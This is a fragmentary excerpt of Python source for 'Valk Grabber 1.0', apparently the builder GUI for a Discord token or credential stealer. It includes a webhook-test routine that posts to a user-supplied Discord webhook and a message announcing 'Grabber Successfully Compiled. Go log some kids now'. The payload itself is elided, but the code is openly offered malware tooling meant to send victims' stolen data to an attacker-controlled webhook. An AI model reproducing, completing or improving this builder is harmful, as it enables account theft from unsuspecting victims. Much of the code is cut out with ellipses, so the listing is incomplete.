...
window = Tk()
window.title("Valk Grabber 1.0 || @rqwal#1111")
...
""")
        ...
        webhook.execute()
        messagebox.showinfo("Valk Grabber 1.0 || @rqwal#1111","Grabber Successfully Compiled. Go log some kids now bitch")
        Menu()
...
class Menu:
    ...
    def _testhook(self):
        ...
        try:
            webhook = DiscordWebhook(url=wbh, username="Valk Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
            embed = DiscordEmbed(title=f"Valk Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
            embed.set_author(name="author : Valk", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
        except:
            messagebox.showerror("Valk Grabber 1.0 || @rqwal#1111","Invalid Webhook")
    ...
    def _verification(self):
        if len(self.webhook.get()) < 5:
            messagebox.showerror("Valk Grabber 1.0 || @rqwal#1111","Webhook too short idiot")
        else:
            try:
